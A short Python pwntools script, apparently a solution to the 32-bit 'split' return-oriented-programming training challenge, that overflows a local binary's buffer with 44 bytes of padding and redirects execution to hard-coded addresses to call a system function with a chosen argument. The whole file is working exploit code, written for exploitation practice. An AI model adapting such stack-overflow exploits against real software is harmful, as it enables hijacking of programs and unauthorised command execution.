from pwn import *

r=process('./split32')

r.recvuntil('> ')

payload='a'*44
payload+=p32(0x0804861a)
payload+=p32(0x0804a030)

r.sendline(payload)

r.interactive()
